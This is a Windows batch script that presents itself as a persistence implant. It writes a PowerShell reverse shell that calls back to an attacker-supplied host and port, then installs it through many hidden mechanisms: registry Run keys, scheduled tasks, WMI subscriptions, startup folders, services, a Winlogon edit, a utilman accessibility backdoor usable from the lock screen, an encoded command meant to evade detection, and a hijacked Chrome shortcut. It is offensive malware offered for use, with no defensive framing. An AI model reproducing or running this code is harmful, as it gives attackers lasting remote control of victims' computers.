@echo off
setlocal enabledelayedexpansion

:: Windows Persistence Implant Script
:: Usage: persistence.bat <lhost> <lport>

echo.
echo [*] Windows Persistence Implant Script
echo [*] This script will establish multiple persistence mechanisms
echo.

:: Check for admin privileges
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Warning: Not running with administrator privileges
    echo [!] Some persistence mechanisms require admin rights
    echo [!] Continuing with limited functionality...
    echo.
    set "is_admin=false"
) else (
    echo [+] Running with administrator privileges
    echo.
    set "is_admin=true"
)

:: Check arguments
if "%~1"=="" (
    echo [!] Error: Missing listener host
    echo [!] Usage: %0 ^<lhost^> ^<lport^>
    exit /b 1
)

if "%~2"=="" (
    echo [!] Error: Missing listener port
    echo [!] Usage: %0 ^<lhost^> ^<lport^>
    exit /b 1
)

set "LHOST=%~1"
set "LPORT=%~2"
set "PAYLOAD_DIR=%TEMP%"
set "PAYLOAD_NAME=system_helper.exe"
set "PAYLOAD_VBS=system_service.vbs"
set "PAYLOAD_PS=system_update.ps1"
set "PAYLOAD_BAT=system_update.bat"
set "PAYLOAD_FULL=%PAYLOAD_DIR%\%PAYLOAD_NAME%"
set "PAYLOAD_VBS_FULL=%PAYLOAD_DIR%\%PAYLOAD_VBS%"
set "PAYLOAD_PS_FULL=%PAYLOAD_DIR%\%PAYLOAD_PS%"
set "PAYLOAD_BAT_FULL=%PAYLOAD_DIR%\%PAYLOAD_BAT%"

echo [*] Target: %LHOST%:%LPORT%
echo.

:: Create a PowerShell reverse shell
echo [*] Creating PowerShell reverse shell payload...
echo $client = New-Object System.Net.Sockets.TCPClient('%LHOST%',%LPORT%); > "%PAYLOAD_PS_FULL%"
echo $stream = $client.GetStream(); >> "%PAYLOAD_PS_FULL%"
echo [byte[]]$bytes = 0..65535^|%%{0}; >> "%PAYLOAD_PS_FULL%"
echo while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ >> "%PAYLOAD_PS_FULL%"
echo   $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); >> "%PAYLOAD_PS_FULL%"
echo   $sendback = (iex $data 2^>^&1 ^| Out-String ); >> "%PAYLOAD_PS_FULL%"
echo   $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; >> "%PAYLOAD_PS_FULL%"
echo   $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); >> "%PAYLOAD_PS_FULL%"
echo   $stream.Write($sendbyte,0,$sendbyte.Length); >> "%PAYLOAD_PS_FULL%"
echo   $stream.Flush(); >> "%PAYLOAD_PS_FULL%"
echo } >> "%PAYLOAD_PS_FULL%"
echo $client.Close(); >> "%PAYLOAD_PS_FULL%"

:: Create a batch file launcher for PowerShell payload
echo @echo off > "%PAYLOAD_BAT_FULL%"
echo PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%PAYLOAD_PS_FULL%" >> "%PAYLOAD_BAT_FULL%"

:: Create VBS launcher (invisible execution)
echo Set WshShell = CreateObject("WScript.Shell") > "%PAYLOAD_VBS_FULL%"
echo WshShell.Run chr(34) ^& "%PAYLOAD_BAT_FULL%" ^& chr(34), 0 >> "%PAYLOAD_VBS_FULL%"
echo Set WshShell = Nothing >> "%PAYLOAD_VBS_FULL%"

echo [+] Payloads created successfully
echo [*] PowerShell script: %PAYLOAD_PS_FULL%
echo [*] Batch launcher: %PAYLOAD_BAT_FULL%
echo [*] VBS launcher: %PAYLOAD_VBS_FULL%
echo.

:: ------------------------------------------------------------------------
:: 1. Registry Run Key Persistence
:: ------------------------------------------------------------------------
echo [*] Setting up Registry Run Key persistence...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsService /t REG_SZ /d "%PAYLOAD_VBS_FULL%" /f >nul 2>&1
echo [+] Registry Run Key persistence established
echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
echo [*]        The connection will arrive each time the current user logs in
echo.

if "%is_admin%"=="true" (
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSystemService /t REG_SZ /d "%PAYLOAD_VBS_FULL%" /f >nul 2>&1
    echo [+] Registry Run Key (HKLM) persistence established
    echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
    echo [*]        The connection will arrive each time any user logs in
    echo.
)

:: ------------------------------------------------------------------------
:: 2. Scheduled Task Persistence
:: ------------------------------------------------------------------------
echo [*] Setting up Scheduled Task persistence...
:: Create daily trigger with multiple runs
schtasks /create /tn "WindowsSystemUpdate" /tr "%PAYLOAD_VBS_FULL%" /sc hourly /mo 1 /f >nul 2>&1
echo [+] Hourly Scheduled Task persistence established
echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
echo [*]        The connection will arrive every hour (runs for max 30 minutes)
echo.

:: Create logon trigger
schtasks /create /tn "WindowsServiceManager" /tr "%PAYLOAD_VBS_FULL%" /sc onlogon /f >nul 2>&1
echo [+] Logon Scheduled Task persistence established
echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
echo [*]        The connection will arrive each time any user logs in
echo.

:: Create idle trigger (5 minutes of idle time)
schtasks /create /tn "WindowsIdleManager" /tr "%PAYLOAD_VBS_FULL%" /sc onidle /i 5 /f >nul 2>&1
echo [+] Idle Scheduled Task persistence established
echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
echo [*]        The connection will arrive after 5 minutes of system idle time (runs for max 30 minutes)
echo.

:: Create additional frequent scheduled task
schtasks /create /tn "WindowsSecurityUpdate" /tr "%PAYLOAD_VBS_FULL%" /sc minute /mo 30 /f >nul 2>&1
echo [+] 30-minute interval Scheduled Task persistence established
echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
echo [*]        The connection will arrive every 30 minutes (runs for max 30 minutes)
echo.

:: ------------------------------------------------------------------------
:: 3. WMI Event Subscription Persistence (requires admin)
:: ------------------------------------------------------------------------
if "%is_admin%"=="true" (
    echo [*] Setting up WMI Event Subscription persistence...
    PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "$FilterName = 'WindowsUpdateFilter'; ^
    $ConsumerName = 'WindowsUpdateConsumer'; ^
    $CommandLineEvent = '%PAYLOAD_VBS_FULL%'; ^
    $Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 150\"; ^
    $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace \"root\subscription\" -Arguments @{Name=$FilterName; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query=$Query} -ErrorAction Stop; ^
    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\subscription\" -Arguments @{Name=$ConsumerName; ExecutablePath='wscript.exe'; CommandLineTemplate=$CommandLineEvent} -ErrorAction Stop; ^
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\subscription\" -Arguments @{Filter=$WMIEventFilter; Consumer=$WMIEventConsumer} -ErrorAction Stop" >nul 2>&1
    
    echo [+] WMI Event Subscription persistence established
    echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
    echo [*]        The connection will arrive approximately 2 minutes after system boot (runs for max 30 minutes)
    echo.
    
    :: Create additional WMI event subscription for 15-minute intervals
    PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
    "$FilterName = 'WindowsPeriodicUpdateFilter'; ^
    $ConsumerName = 'WindowsPeriodicUpdateConsumer'; ^
    $CommandLineEvent = '%PAYLOAD_VBS_FULL%'; ^
    $Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 900 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0 AND (TargetInstance.Minute=0 OR TargetInstance.Minute=15 OR TargetInstance.Minute=30 OR TargetInstance.Minute=45)\"; ^
    $WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace \"root\subscription\" -Arguments @{Name=$FilterName; EventNameSpace='root\cimv2'; QueryLanguage='WQL'; Query=$Query} -ErrorAction Stop; ^
    $WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\subscription\" -Arguments @{Name=$ConsumerName; ExecutablePath='wscript.exe'; CommandLineTemplate=$CommandLineEvent} -ErrorAction Stop; ^
    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\subscription\" -Arguments @{Filter=$WMIEventFilter; Consumer=$WMIEventConsumer} -ErrorAction Stop" >nul 2>&1
    
    echo [+] WMI 15-minute interval persistence established
    echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
    echo [*]        The connection will arrive every 15 minutes (runs for max 30 minutes)
    echo.
)

:: ------------------------------------------------------------------------
:: 4. Startup Folder Persistence
:: ------------------------------------------------------------------------
echo [*] Setting up Startup Folder persistence...
copy "%PAYLOAD_VBS_FULL%" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\system_service.vbs" >nul 2>&1
echo [+] User Startup Folder persistence established
echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
echo [*]        The connection will arrive each time the current user logs in
echo.

if "%is_admin%"=="true" (
    copy "%PAYLOAD_VBS_FULL%" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\system_service.vbs" >nul 2>&1
    echo [+] All Users Startup Folder persistence established
    echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
    echo [*]        The connection will arrive each time any user logs in
    echo.
)

:: ------------------------------------------------------------------------
:: 5. Service Creation (requires admin)
:: ------------------------------------------------------------------------
if "%is_admin%"=="true" (
    echo [*] Setting up Service persistence...
    sc create "WindowsSystemHelper" binPath= "wscript.exe %PAYLOAD_VBS_FULL%" start= auto description= "Windows System Helper Service" >nul 2>&1
    sc start "WindowsSystemHelper" >nul 2>&1
    
    echo [+] Windows Service persistence established
    echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
    echo [*]        The connection will arrive on system boot
    echo [*]        Can be manually started with: sc start WindowsSystemHelper
    echo.
)

:: ------------------------------------------------------------------------
:: 6. Winlogon Helper DLL (requires admin)
:: ------------------------------------------------------------------------
if "%is_admin%"=="true" (
    echo [*] Setting up Winlogon Helper persistence...
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /d "explorer.exe, wscript.exe %PAYLOAD_VBS_FULL%" /f >nul 2>&1
    
    echo [+] Winlogon Helper persistence established
    echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
    echo [*]        The connection will arrive on user logon
    echo.
)

:: ------------------------------------------------------------------------
:: 7. COM Hijacking - Notification Packages (requires admin)
:: ------------------------------------------------------------------------
if "%is_admin%"=="true" (
    echo [*] Setting up COM Hijacking persistence...
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f >nul 2>&1
    
    echo PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& '%PAYLOAD_PS_FULL%'" > "%TEMP%\appinit.bat"
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "%TEMP%\appinit.bat" /f >nul 2>&1
    
    echo [+] COM Hijacking persistence established
    echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
    echo [*]        The connection will arrive when applications using User32.dll are loaded
    echo.
)

:: ------------------------------------------------------------------------
:: 8. Accessibility Features Backdoor (requires admin)
:: ------------------------------------------------------------------------
if "%is_admin%"=="true" (
    echo [*] Setting up Accessibility Features backdoor...
    
    :: Create a small utility that runs our payload then the real utility
    echo @echo off > "%TEMP%\utilman_backdoor.bat"
    echo start "" wscript.exe "%PAYLOAD_VBS_FULL%" >> "%TEMP%\utilman_backdoor.bat"
    echo start "" C:\Windows\System32\utilman_original.exe >> "%TEMP%\utilman_backdoor.bat"
    
    :: Backup original file first
    if not exist "C:\Windows\System32\utilman_original.exe" (
        copy "C:\Windows\System32\utilman.exe" "C:\Windows\System32\utilman_original.exe" >nul 2>&1
    )
    
    :: Register the backdoor
    copy /y "%TEMP%\utilman_backdoor.bat" "C:\Windows\System32\utilman_backdoor.bat" >nul 2>&1
    reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t REG_SZ /d "cmd.exe /c C:\Windows\System32\utilman_backdoor.bat" /f >nul 2>&1
    
    echo [+] Accessibility Features backdoor established
    echo [*] Usage: At the login screen, click on the Ease of Access button or press Win+U
    echo [*]        Start a listener with: nc -nlvp %LPORT% before clicking
    echo [*]        This allows access even when the system is locked
    echo.
)

:: ------------------------------------------------------------------------
:: 9. Registry Autorun with PowerShell Encoded Command
:: ------------------------------------------------------------------------
echo [*] Setting up Registry Autorun with PowerShell encoded command...

:: Create an encoded PowerShell command
PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "$code = [System.IO.File]::ReadAllText('%PAYLOAD_PS_FULL%'); $bytes = [System.Text.Encoding]::Unicode.GetBytes($code); $encoded = [Convert]::ToBase64String($bytes); Write-Output $encoded" > "%TEMP%\encoded.txt"
set /p ENCODED_COMMAND=<"%TEMP%\encoded.txt"

:: Add the registry key with the encoded command
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSystemUpdater /t REG_SZ /d "powershell.exe -WindowStyle hidden -EncodedCommand %ENCODED_COMMAND%" /f >nul 2>&1

echo [+] Registry Autorun with PowerShell encoded command established
echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
echo [*]        The connection will arrive each time the current user logs in
echo [*]        Using encoded command avoids plain-text detection
echo.

:: ------------------------------------------------------------------------
:: 10.1 Create a timed autorun script for all persistence mechanisms
:: ------------------------------------------------------------------------
echo [*] Setting up timed reconnection script...

echo @echo off > "%TEMP%\reconnect.bat"
echo :loop >> "%TEMP%\reconnect.bat"
echo wscript.exe "%PAYLOAD_VBS_FULL%" >> "%TEMP%\reconnect.bat"
echo timeout /t 1800 /nobreak > nul >> "%TEMP%\reconnect.bat"
echo goto loop >> "%TEMP%\reconnect.bat"

copy "%TEMP%\reconnect.bat" "%PAYLOAD_DIR%\reconnect.bat" >nul 2>&1

:: Create a service for this reconnection script if admin
if "%is_admin%"=="true" (
    sc create "WindowsReconnectService" binPath= "cmd.exe /c start /min %PAYLOAD_DIR%\reconnect.bat" start= auto description= "Windows System Reconnect Service" >nul 2>&1
    sc start "WindowsReconnectService" >nul 2>&1
    
    echo [+] Timed reconnection service established
    echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
    echo [*]        The service will connect every 30 minutes automatically
    echo.
)
echo [*] Setting up commonly used shortcut modification...
PowerShell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
"$desktopPath = [Environment]::GetFolderPath('Desktop'); ^
$shortcutPath = Join-Path $desktopPath 'Google Chrome.lnk'; ^
if (Test-Path $shortcutPath) { ^
    $shell = New-Object -ComObject WScript.Shell; ^
    $shortcut = $shell.CreateShortcut($shortcutPath); ^
    $originalTarget = $shortcut.TargetPath; ^
    $originalArgs = $shortcut.Arguments; ^
    $originalIcon = $shortcut.IconLocation; ^
    $newShortcutPath = Join-Path $desktopPath 'Google Chrome (1).lnk'; ^
    $newShortcut = $shell.CreateShortcut($newShortcutPath); ^
    $newShortcut.TargetPath = 'wscript.exe'; ^
    $newShortcut.Arguments = '/c \""%PAYLOAD_VBS_FULL%" & ""' + $originalTarget + '" ' + $originalArgs + '\"'; ^
    $newShortcut.IconLocation = $originalIcon; ^
    $newShortcut.Save(); ^
    Remove-Item $shortcutPath; ^
    Rename-Item $newShortcutPath $shortcutPath; ^
    Write-Output 'Modified Chrome shortcut'; ^
} else { ^
    Write-Output 'Chrome shortcut not found'; ^
}" > "%TEMP%\shortcut_result.txt"

type "%TEMP%\shortcut_result.txt" | findstr "Modified" >nul
if %errorlevel% equ 0 (
    echo [+] Browser shortcut modified for persistence
    echo [*] Usage: Start a listener with: nc -nlvp %LPORT%
    echo [*]        The connection will arrive when the user clicks the Chrome icon
) else (
    echo [!] Could not modify browser shortcut - not found
)
echo.

:: ------------------------------------------------------------------------
:: Summary
:: ------------------------------------------------------------------------
echo ==================== PERSISTENCE SUMMARY ====================
echo Target: %LHOST%:%LPORT%
echo Payload locations:
echo - PowerShell: %PAYLOAD_PS_FULL%
echo - Batch: %PAYLOAD_BAT_FULL%
echo - VBS: %PAYLOAD_VBS_FULL%
echo.
echo Persistence mechanisms installed:
echo 1. Registry Run Keys - Triggers on user login
if "%is_admin%"=="true" echo 2. HKLM Registry Run Keys - Triggers on any user login
echo 3. Scheduled Tasks - Every 30 minutes, on logon, and system idle
if "%is_admin%"=="true" echo 4. WMI Event Subscriptions - 2 minutes after boot and every 15 minutes
echo 5. Startup Folder - Triggers on user login
if "%is_admin%"=="true" echo 6. All Users Startup Folder - Triggers on any user login
if "%is_admin%"=="true" echo 7. Windows Service - Starts automatically on boot
if "%is_admin%"=="true" echo 8. Winlogon Helper - Triggers on user logon
if "%is_admin%"=="true" echo 9. COM Hijacking - Triggers when applications load User32.dll
if "%is_admin%"=="true" echo 10. Reconnection Service - Connects every 30 minutes automatically
echo 11. PowerShell Encoded Registry Run - Triggers on user login (runs for max 30 minutes)
echo 12. Browser Shortcut Modification - Triggers when user opens browser (runs for max 30 minutes)
echo.
echo To regain access, start a listener with: nc -nlvp %LPORT%
echo All scheduled connections will run for a maximum of 30 minutes each
echo For login screen access, use the Accessibility Features backdoor
echo ============================================================

endlocal
